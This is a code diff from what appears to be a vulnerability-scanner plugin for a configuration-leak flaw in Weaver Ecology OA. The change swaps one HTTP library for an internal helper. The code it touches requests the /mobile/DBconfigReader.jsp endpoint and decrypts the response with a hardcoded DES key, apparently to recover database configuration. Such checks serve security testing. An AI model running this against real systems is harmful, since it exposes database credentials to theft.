@@ -8,8 +8,8 @@ description: 泛微-OA Config信息泄露漏洞
 import json
 import pyDes
 import urllib3
-import requests
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Weaver_Ecology_Oa_Config_BaseVerify:
     def __init__(self, url):
@@ -21,7 +21,7 @@ class Weaver_Ecology_Oa_Config_BaseVerify:
     def run(self):
         try:
             url = self.url + "/mobile/DBconfigReader.jsp"
-            check_req = requests.get(url, headers = self.headers, allow_redirects = False, verify = False, timeout = 10)
+            check_req = request.get(url, headers = self.headers)
             if check_req.status_code == 200:
                 cipherX = pyDes.des('        ')
                 cipherX.setKey('1z2x3c4v5b6n')
